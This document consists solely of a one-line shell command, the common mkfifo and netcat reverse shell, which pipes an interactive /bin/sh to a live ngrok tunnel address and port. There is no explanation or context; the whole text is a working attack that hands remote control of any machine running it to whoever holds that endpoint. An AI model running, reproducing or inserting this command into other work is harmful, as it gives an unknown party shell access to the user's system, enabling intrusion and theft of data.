rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 0.tcp.in.ngrok.io 17960  >/tmp/f
